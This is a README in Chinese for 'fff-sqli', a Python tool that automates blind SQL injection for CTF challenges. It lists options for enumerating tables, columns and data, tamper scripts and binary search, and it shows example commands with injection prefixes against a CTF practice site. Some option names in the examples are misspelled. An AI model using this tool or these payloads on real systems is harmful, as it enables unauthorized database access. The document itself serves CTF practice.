# fff-sqli
A tool for CTF's bind-sqli challenge

CTF的盲注总是要重新修改脚本，不胜其烦。于是写了这个工具，在Kali上测试通过。参数作以下几点说明

## 参数说明

-  -u参数是地址
- --tales 1 获取当前数据库所有表名
- --columns flag 获取flag表的所有列名
- -T user -C password 获取user表password列的值
- --headers 自定义请求头
- --data 以POST方式提交时候，所POST的数据,加星号* 表示payload的位置 如 username=admin'||*&password=admin
- -v 1 输出payload
- --sub 1 sub参数表示对截取字符串的函数进行选择，内置四种
- --tamper 调用tamper文件里bypass脚本，调用其tamper函数对payload进行处理，--tamper "space2comment" 则调用space2comment这个脚本，将空格转化为`/**/`
- --way 1 默认0，为1时采用二分法进行盲注
- --prefix --suffix对payload进行拼接
- --keywords 判断 true和false的关键词
- --proxy 自定义代理
- --cookie 自定义cookie

## 使用示例

注入站点：http://ctf5.shiyanbar.com/web/index_3.php

keywords: Hello

Usage: 
```
Usage : 
        python fffsqli.py [URL] [DATA] [KEYWORDS] ...
Example : 
        python fffsqi.py -u "http://127.0.0.1/?id=1" --keywords "key" --tables 1
Author : 
        Deen <1123537671@qq.com>
```

获取表名：

`python fffsqli.py -u "http://ctf5.shiyanbar.com/web/index_3.php" --prefx "'||" --suffix "||'"  --keywords "Hello" --tables 1 --way 1`

获取列名：

`python fffsqli.py -u "http://ctf5.shiyanbar.com/web/index_3.php" --prefx "'||" --suffix "||'"  --keywords "Hello" --columns flag --way 1`

获取数据：

`python fffsqli.py -u "http://ctf5.shiyanbar.com/web/index_3.php" --prefx "'||" --suffix "||'"  --keywords "Hello" -T flag -C flag --way 1`

## 截图展示


![](https://github.com/deenrookie/fff-sqli/blob/master/images/2017-11-23-185739_791x552_scrot.png)
![](https://github.com/deenrookie/fff-sqli/blob/master/images/2017-11-23-190223_792x546_scrot.png)

## TODO

- [ ] 添加bypass脚本
- [ ] 启用多线程进行注入
- [ ] 添加注入点fuzz功能
- [ ] 代码优化以及某些细节的异常处理


